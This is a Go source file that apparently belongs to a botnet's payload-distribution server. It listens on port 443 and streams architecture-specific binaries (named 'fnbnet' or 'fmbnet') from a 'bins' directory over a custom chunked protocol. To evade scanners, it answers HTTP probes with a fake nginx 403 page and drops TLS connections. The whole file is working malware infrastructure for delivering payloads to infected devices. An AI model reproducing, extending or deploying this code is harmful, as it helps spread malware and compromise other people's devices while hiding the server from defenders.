package main

import (
	"encoding/binary"
	"fmt"
	"net"
	"os"
	"path/filepath"
	"strings"
	"time"
)

const binPort = ":443"
const binsDir = "/var/www/html/bins"

type BinServer struct {
	listener net.Listener
}

func StartBinServer() (*BinServer, error) {
	ln, err := net.Listen("tcp", binPort)
	if err != nil {
		return nil, fmt.Errorf("bin server listen: %w", err)
	}

	bs := &BinServer{listener: ln}
	go bs.acceptLoop()
	return bs, nil
}

func (bs *BinServer) acceptLoop() {
	for {
		conn, err := bs.listener.Accept()
		if err != nil {
			continue
		}
		go bs.handleConn(conn)
	}
}

func (bs *BinServer) handleConn(conn net.Conn) {
	defer conn.Close()

	buf := make([]byte, 1024)
	conn.SetReadDeadline(time.Now().Add(5 * time.Second))
	n, err := conn.Read(buf)
	if err != nil || n == 0 {
		return
	}
	conn.SetReadDeadline(time.Time{})

	// detect protocol
	if n >= 3 && buf[0] == '\x16' && buf[1] == '\x03' {
		return
	}
	if n >= 4 && string(buf[:4]) == "GET " || (n >= 5 && string(buf[:5]) == "POST ") {
		bs.handleHTTP(conn)
		return
	}
	if n >= 20 && strings.HasPrefix(string(buf[:n]), "HEAD ") {
		bs.handleHTTP(conn)
		return
	}

	// binary protocol: [arch_len:2][arch...]
	if n < 2 {
		return
	}
	archLen := int(binary.BigEndian.Uint16(buf[:2]))
	if archLen < 1 || archLen > 64 || n < 2+archLen {
		return
	}
	arch := string(buf[2 : 2+archLen])

	bs.streamBinary(conn, arch)
}

func (bs *BinServer) handleHTTP(conn net.Conn) {
	resp := "HTTP/1.1 403 Forbidden\r\n" +
		"Server: nginx/1.18.0\r\n" +
		"Content-Type: text/html\r\n" +
		"Content-Length: 114\r\n" +
		"Connection: close\r\n" +
		"\r\n" +
		"<html><head><title>403 Forbidden</title></head><body><center><h1>403 Forbidden</h1></center></body></html>"
	conn.Write([]byte(resp))
}

func (bs *BinServer) streamBinary(conn net.Conn, arch string) {
	binPath := filepath.Join(binsDir, "fnbnet."+arch)
	if _, err := os.Stat(binPath); os.IsNotExist(err) {
		binPath = filepath.Join(binsDir, "fmbnet."+arch)
	}

	f, err := os.Open(binPath)
	if err != nil {
		resp := make([]byte, 8)
		binary.BigEndian.PutUint32(resp[0:4], 0)
		conn.Write(resp)
		return
	}
	defer f.Close()

	stat, _ := f.Stat()
	totalSize := uint32(stat.Size())

	buf := make([]byte, UpdateChunkSize)
	sent := uint32(0)

	for sent < totalSize {
		n, _ := f.Read(buf)
		if n <= 0 {
			break
		}
		chunk := buf[:n]

		resp := make([]byte, 10+len(chunk))
		binary.BigEndian.PutUint32(resp[0:4], totalSize)
		binary.BigEndian.PutUint32(resp[4:8], sent)
		binary.BigEndian.PutUint16(resp[8:10], uint16(len(chunk)))
		copy(resp[10:], chunk)

		if _, err := conn.Write(resp); err != nil {
			return
		}
		sent += uint32(n)
	}

	eof := make([]byte, 2)
	binary.BigEndian.PutUint16(eof, 0xFFFF)
	conn.Write(eof)
}

func strContains(s, sub string) bool {
	return strings.Contains(s, sub)
}
